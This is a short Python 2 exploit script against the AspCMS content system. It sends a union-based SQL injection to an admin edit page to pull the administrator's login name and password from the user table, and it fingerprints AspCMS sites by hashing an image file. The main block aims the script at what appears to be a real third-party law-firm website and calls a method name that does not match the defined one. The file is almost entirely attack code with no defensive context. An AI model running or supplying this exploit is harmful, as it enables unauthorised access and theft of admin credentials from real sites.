# -*-coding:utf-8 -*-
import requests
from lxml import etree
from hashlib import md5

class aspcms:

    def exp(self, url, method="get", data={}):
        exp = "/admin/_content/_About/AspCms_AboutEdit.asp?id=19%20and%201=2%20union%20select%201,2,3,4,5,loginname,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,password%20from%20aspcms_user%20where%20userid=1"
        headers = {
            'user-agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.94 Safari/537.36'}
        try:
            page = requests.get(url + exp, verify=False, timeout=3, headers=headers).text
        except requests.RequestException as e:
            return False
        ss = etree.HTML(page)
        username = ss.xpath("//*[@name='SortName']/@value")
        password = ss.xpath("//*[@id='Content']/@value")
        return 'username = '+username[0] + 'password = '+password[0]

    def getfinger(self, url):
        finger_file = "/images/Album/ajax-loader.gif"
        headers = {
            'user-agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.94 Safari/537.36'}
        try:
            page = requests.get(url + finger_file, verify=False, timeout=3, headers=headers).content
        except requests.RequestException as e:
            return False
        m = md5()
        m.update(page)
        if m.hexdigest() == 'b510c4dad0306362c9168bad613393bc':
            return 'aspcms'
        else:
            return False


if __name__ == '__main__':
    aspcms = aspcms().finger("http://www.liyuanlawyer.com/")
    print aspcms
